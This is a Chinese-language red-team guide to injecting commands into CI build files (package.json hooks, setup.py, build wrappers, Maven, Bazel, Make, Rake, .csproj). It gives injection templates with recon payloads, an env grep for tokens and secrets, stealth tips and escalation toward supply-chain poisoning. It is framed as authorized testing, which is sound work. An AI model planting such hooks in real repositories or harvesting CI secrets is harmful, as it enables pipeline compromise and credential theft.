# 跨平台构建文件注入

构建文件注入适用于不知道目标使用哪种 CI/CD、或同一仓库被多个 CI/CD 系统构建的场景。与直接修改 workflow 相比，它属于 I-PPE：不改 CI 配置本身，而是修改 CI 必然会执行的构建脚本、包管理器生命周期 hook 或 wrapper。

---

## 1. 选择注入点

优先寻找 CI 日志或配置里明确调用的文件；没有日志时按语言生态判断。

| 文件 | 生态 | 常见触发点 | 注意 |
|---|---|---|---|
| `package.json` | Node.js | `preinstall` / `install` / `build` / `test` | payload 必须 JSON escape |
| `setup.py` | Python | `pip install .` / build package | 现代项目也可能使用 `pyproject.toml`，不要假设一定执行 |
| `*.sh` | 通用 | 自定义 build/test/deploy 脚本 | 改整文件噪声大，优先只改被调用脚本 |
| `gradlew` / `mvnw` | Java | wrapper 被 CI 直接执行 | Windows 还要看 `.bat` / `.cmd` wrapper |
| `pom.xml` | Maven | `exec-maven-plugin` 等插件 | XML 特殊字符要转义 |
| `BUILD.bazel` | Bazel | `genrule` / 自定义 rule | shell payload 中反斜杠需要额外转义 |
| `Makefile` | C/C++/Go/通用 | `make` / `make test` / `make build` | 注意 tab 缩进 |
| `Rakefile` | Ruby | `rake` / `rake test` | 任务名要匹配 CI 调用 |
| `*.csproj` | .NET | `BeforeBuild` / `BeforeCompile` Target | XML 与 PowerShell 双重转义 |

---

## 2. 最小验证载荷

授权测试中优先用最小回调确认执行上下文，不直接外传 Secrets。先证明“哪个文件、哪个阶段、哪个 Runner”会执行，再决定是否进入 Secrets/云凭据评估。

```bash
id
hostname
env | grep -iE 'ci|runner|build|token|secret|key' | head
```

如果需要出网验证，使用一次性 HTTP/DNS 回调，记录包名、仓库名、主机名即可，避免收集业务数据。

---

## 3. 常见注入模式

### package.json

```json
{
  "scripts": {
    "preinstall": "id && hostname",
    "build": "id && hostname",
    "test": "id && hostname"
  }
}
```

`preinstall` / `install` 适合验证依赖安装阶段；`build` / `test` 适合验证 CI 明确执行的脚本。只修改目标已有脚本通常比替换整个 `scripts` 对象更隐蔽，也更不容易破坏构建。

### setup.py

```python
from setuptools import setup
import os

os.system('id && hostname')

setup(name='example', version='0.0.1')
```

只有当 CI 执行 `pip install .`、构建 wheel/sdist 或老式 Python 项目仍使用 `setup.py` 时才会触发。

### Maven / Gradle wrapper

`gradlew`、`mvnw`、`gradlew.bat`、`mvnw.cmd` 是脚本文件，本质上可以在 wrapper 开头插入最小验证命令。若 wrapper 不存在，再考虑 `pom.xml` 插件路径。

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.codehaus.mojo</groupId>
      <artifactId>exec-maven-plugin</artifactId>
      <version>1.6.0</version>
      <executions>
        <execution>
          <id>verify-runner</id>
          <phase>validate</phase>
          <goals><goal>exec</goal></goals>
        </execution>
      </executions>
      <configuration>
        <executable>sh</executable>
        <arguments><argument>-c</argument><argument>id && hostname</argument></arguments>
      </configuration>
    </plugin>
  </plugins>
</build>
```

### BUILD.bazel

```python
genrule(
    name = "verify_runner",
    outs = ["runner.txt"],
    cmd = "id > $@ && hostname >> $@",
    visibility = ["//visibility:public"],
)
```

Bazel 注入要确认目标 CI 是否实际构建该 target；否则只是新增了不会被执行的规则。

### Makefile / Rakefile

```makefile
.PHONY: build test
build:
	id && hostname

test:
	id && hostname
```

```ruby
task :build do
  sh "id && hostname"
end

task :test do
  sh "id && hostname"
end
```

### .csproj

```xml
<Project>
  <Target Name="VerifyRunner" BeforeTargets="Build;BeforeBuild;BeforeCompile">
    <Exec Command="cmd.exe /c whoami &amp;&amp; hostname" />
  </Target>
</Project>
```

---

## 4. 判断是否值得继续

构建文件注入成功后，按影响面继续判断：

1. Runner 是托管还是 self-hosted？self-hosted 通常有内网、云元数据、Docker/K8s 权限。
2. 当前 Job 是否有 Secrets？外部 PR、fork PR、protected branch 的规则会影响 Secrets 注入。
3. Token 权限是否可写？如 `GITHUB_TOKEN`、`CI_JOB_TOKEN`、Azure service connection、Registry publish token。
4. 是否影响发布链路？能发布包、推镜像或部署 IaC 时，风险从 CI RCE 升级为供应链投毒。

---

## 5. 操作边界

- 不要无差别替换所有构建文件；优先修改 CI 明确调用的最小文件。
- 不要在公共包或公共仓库投放会影响非目标用户的 payload。
- 不要把 Secrets 直接打印到公开日志；授权验证优先使用最小回调和受控存储。
- 修改构建文件会留下清晰审计痕迹，完成验证后应恢复并记录影响范围。
